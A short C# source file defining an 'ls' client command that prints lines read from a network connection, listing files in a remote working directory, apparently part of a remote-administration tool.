using System;
using System.Collections.Generic;
using System.IO;

namespace ClientCommands
{
    internal class LS : ICommand
    {
        public string name { get; set; } = "ls";

        public string description { get; set; } = "Display the files and folders name of the remote current working directory";

        public string syntaxHelper { get; set; } = "ls";

        public bool isLocal { get; set; } = false;

        public List<string> validArguments { get; set; } = null;


        public void Process(List<string> args)
        {
            var data = "";
            while (data != "{end}")
            {
                if (data != "")
                    Console.WriteLine(data);
                data = ClientCommandsManager.networkManager.ReadLine();
            }
        }
    }
}
